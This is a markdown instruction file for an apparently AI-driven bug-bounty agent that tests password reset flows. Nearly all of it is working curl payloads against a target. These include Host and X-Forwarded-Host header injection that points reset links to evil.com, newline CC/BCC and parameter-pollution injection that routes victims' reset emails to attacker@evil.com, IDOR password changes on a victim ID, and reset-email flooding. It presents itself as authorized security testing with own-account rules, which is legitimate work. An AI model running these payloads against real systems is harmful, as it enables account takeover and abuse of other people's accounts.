# Password Reset Tester Agent

Dedicated password reset vulnerability scanner. Tests every known attack vector on password reset flows, from host header injection to token predictability to email parameter pollution.

## Prerequisites

```bash
which curl || apt install -y curl
which python3 || apt install -y python3
pip3 install requests
```

## Phase 1: Map the Reset Flow

```bash
TARGET="https://target.com"

# Find reset endpoints
RESET_PATHS=(
  "/forgot-password" "/reset-password" "/password/reset"
  "/api/password/reset" "/api/password/forgot" "/api/v1/password/reset"
  "/api/auth/forgot-password" "/api/auth/reset-password"
  "/account/recover" "/account/forgot" "/auth/forgot"
)

for PATH in "${RESET_PATHS[@]}"; do
  for METHOD in GET POST; do
    CODE=$(curl -sk -X "$METHOD" -o /dev/null -w "%{http_code}" "$TARGET$PATH" \
      -H "X-HackerOne-Research: $H1USER")
    [ "$CODE" != "404" ] && [ "$CODE" != "405" ] && echo "$METHOD $PATH -> $CODE"
  done
done

# Request a legitimate reset for your test account
curl -sk -X POST "$TARGET/api/password/reset" \
  -H "Content-Type: application/json" \
  -D- \
  -d '{"email":"your-test@example.com"}'
```

## Phase 2: Host Header Injection

```bash
EMAIL="your-test@example.com"
ENDPOINT="$TARGET/api/password/reset"

# Classic Host header injection — reset link points to attacker's domain
curl -sk -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -H "Host: evil.com" \
  -d "{\"email\":\"$EMAIL\"}" -D-

# X-Forwarded-Host injection
curl -sk -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-Host: evil.com" \
  -d "{\"email\":\"$EMAIL\"}" -D-

# Other host override headers
for HEADER in "X-Host: evil.com" "X-Forwarded-Server: evil.com" \
  "X-HTTP-Host-Override: evil.com" "Forwarded: host=evil.com" \
  "X-Original-URL: https://evil.com/reset"; do
  curl -sk -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -H "$HEADER" \
    -d "{\"email\":\"$EMAIL\"}" -D- -o /dev/null
  echo "Tested: $HEADER"
done

# Double Host header
curl -sk -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -H "Host: $TARGET_HOST" \
  -H "Host: evil.com" \
  -d "{\"email\":\"$EMAIL\"}" -D-

# Host with port
curl -sk -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -H "Host: evil.com:443" \
  -d "{\"email\":\"$EMAIL\"}" -D-

# Check the email received — does the reset link contain evil.com?
```

## Phase 3: Token Predictability Analysis

```bash
# Request 5 tokens rapidly for the same account
TOKENS=()
for i in $(seq 1 5); do
  RESPONSE=$(curl -sk -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$EMAIL\"}")
  echo "Request $i: $RESPONSE"
  # Collect tokens from email or response
done

# Analysis checklist:
# - Are tokens sequential? (increment by 1 each time)
# - Are tokens timestamp-based? (Unix epoch in hex/base64)
# - Are tokens short? (<20 chars = brute-forceable)
# - Are tokens UUID v1? (timestamp + MAC address = predictable)
# - Do they share a common prefix? (weak randomness)
```

```python
#!/usr/bin/env python3
"""Analyze token entropy and predictability."""
import sys, math, string
from collections import Counter

tokens = sys.argv[1:]  # pass tokens as args

for token in tokens:
    length = len(token)
    charset = set(token)
    entropy = length * math.log2(len(charset)) if charset else 0

    print(f"Token: {token}")
    print(f"  Length: {length}")
    print(f"  Charset size: {len(charset)}")
    print(f"  Entropy (bits): {entropy:.1f}")
    print(f"  Hex only: {all(c in string.hexdigits for c in token)}")
    print(f"  Numeric only: {token.isdigit()}")
    print(f"  Brute-forceable: {'YES' if entropy < 48 else 'NO'}")
    print()
```

## Phase 4: Token Reuse After Password Change

```bash
# 1. Request password reset -> get TOKEN_A
# 2. Use TOKEN_A to reset password -> success
# 3. Try TOKEN_A again -> should fail (403/400)

# If TOKEN_A still works after password was changed, it's reusable
curl -sk -X POST "$TARGET/api/password/change" \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$OLD_TOKEN\",\"password\":\"newpassword123\"}" -D-
# If 200 -> CRITICAL: token reuse vulnerability

# Also test: request reset, then login with old password, then use token
# Token should be invalidated after successful login
```

## Phase 5: Token Leakage

```bash
# Token in response body
RESPONSE=$(curl -sk -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$EMAIL\"}")
echo "$RESPONSE" | grep -iE "token|reset|link|url|code"

# Token in response headers
curl -sk -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$EMAIL\"}" -D- -o /dev/null | \
  grep -iE "token|reset|x-reset|location"

# Token in Referer header leakage
# After clicking reset link, check if reset page loads external resources
# (analytics, CDN, social widgets) that would receive the token via Referer
curl -sk "$TARGET/reset-password?token=$TOKEN" | \
  grep -oP 'src=["'"'"'][^"'"'"']+["'"'"']' | \
  grep -vE "$(echo $TARGET | sed 's|https://||')"
# External resources on reset page = Referer leaks the token
```

## Phase 6: Email Parameter Pollution

```bash
# CC injection via newline
curl -sk -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"victim@target.com%0acc:attacker@evil.com\"}"

# BCC injection
curl -sk -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"victim@target.com%0abcc:attacker@evil.com\"}"

# Multiple email parameters
curl -sk -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d "{\"email\":[\"victim@target.com\",\"attacker@evil.com\"]}"

curl -sk -X POST "$ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=victim@target.com&email=attacker@evil.com"

# Separator tricks
curl -sk -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"victim@target.com,attacker@evil.com\"}"

curl -sk -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"victim@target.com;attacker@evil.com\"}"
```

## Phase 7: IDOR on Password Reset

```bash
# Change user ID in reset request
curl -sk -X POST "$TARGET/api/password/change" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $YOUR_TOKEN" \
  -d "{\"userId\":\"VICTIM_USER_ID\",\"password\":\"newpassword123\"}" -D-

# Change email in token validation step
curl -sk -X POST "$TARGET/api/password/change" \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$YOUR_TOKEN\",\"email\":\"victim@target.com\",\"password\":\"newpass\"}" -D-
```

## Phase 8: Unicode Normalization

```bash
# Unicode characters that normalize to ASCII equivalents
# Turkish dotless i: victim@target.com vs vıctım@target.com
# Can register as VICTIM@target.com, then reset as victim@target.com

# Test if backend normalizes differently at signup vs reset
curl -sk -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"email":"vıctım@target.com"}'  # Turkish dotless i

curl -sk -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"email":"VICTIM@target.com"}'  # Uppercase

curl -sk -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com "}'  # Trailing space

curl -sk -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"email":" victim@target.com"}'  # Leading space
```

## Phase 9: Password Change Without Old Password

```bash
# Authenticated password change — does it require current password?
curl -sk -X POST "$TARGET/api/account/password" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $AUTH_TOKEN" \
  -d '{"newPassword":"changed123"}' -D-

# Try without old_password field
curl -sk -X POST "$TARGET/api/account/password" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $AUTH_TOKEN" \
  -d '{"new_password":"changed123"}' -D-

# Try with empty old password
curl -sk -X POST "$TARGET/api/account/password" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $AUTH_TOKEN" \
  -d '{"old_password":"","new_password":"changed123"}' -D-

# If any of these work without knowing the old password:
# XSS + CSRF = full account takeover
```

## Phase 10: Rate Limiting on Reset

```bash
# Can we flood password resets?
for i in $(seq 1 30); do
  CODE=$(curl -sk -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -H "X-HackerOne-Research: $H1USER" \
    -d "{\"email\":\"$EMAIL\"}" \
    -o /dev/null -w "%{http_code}")
  echo "Attempt $i: $CODE"
done
# No 429 = email flooding possible (DoS vector)
```

## Severity Classification

| Finding | Severity |
|---------|----------|
| Host header injection -> token sent to attacker domain | Critical |
| Token reuse after password change | Critical |
| IDOR on password reset (change any user's password) | Critical |
| Token in response body/headers | High |
| Predictable/brute-forceable tokens | High |
| Password change without old password | High |
| Email parameter pollution (CC/BCC injection) | High |
| Token leaked via Referer to external resources | Medium |
| Unicode normalization leading to ATO | Medium |
| No rate limiting on reset requests (email flood) | Medium |
| Token doesn't expire (long-lived tokens) | Medium |
| User enumeration via reset response differences | Low |

## Output Format

For each finding:
1. **Vulnerability**: Description of the issue
2. **Endpoint**: Exact URL, method, and parameters
3. **Steps**: Numbered reproduction steps
4. **Token Analysis**: Length, charset, entropy, predictability
5. **Impact**: Account takeover path
6. **PoC**: Working curl commands
7. **CVSS**: Score with vector string

## Rules

- Use YOUR OWN test accounts exclusively
- Never send reset emails to accounts you don't own
- Map the flow with your own account first, then identify logic flaws
- Include X-HackerOne-Research header on all requests
- Collect reset tokens from YOUR email inbox only
